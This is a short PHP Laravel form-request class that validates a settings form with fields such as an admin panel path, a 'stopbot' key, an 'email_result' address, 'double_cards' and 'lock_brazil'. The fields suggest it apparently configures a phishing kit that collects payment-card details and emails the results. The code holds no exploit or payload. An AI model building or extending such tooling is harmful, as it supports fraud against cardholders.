<?php

namespace App\Http\Requests;

use Auth;
use Illuminate\Contracts\Validation\ValidationRule;
use Illuminate\Foundation\Http\FormRequest;

class UpdateSettingsRequest extends FormRequest {
    /**
     * Determine if the user is authorized to make this request.
     */
    public function authorize(): bool
    {
        return Auth::check();
    }

    /**
     * Get the validation rules that apply to the request.
     *
     * @return array<string, ValidationRule|array|string>
     */
    public function rules(): array
    {
        return [
            'admin_panel' => 'filled|string|min:3', // text
            'username' => 'filled|string|min:5', // text
            'password' => 'filled|string|min:5', // text
            'stopbot' => 'nullable|array|required_array_keys:key', // text
            'stopbot.key' => 'string|min:1', // text
            'stopbot.confname' => 'nullable|min:1', // text
            'email_result' => 'filled|email', // email
            'parameter' => 'nullable|alpha_num',// text
            'external_redirect' => 'url',
            'redirect_on_finish' => 'filled|bool', // checkbox
            'double_cards' => 'filled|bool', // checkbox
            'lock_brazil' => 'filled|bool', // checkbox
        ];
    }
}
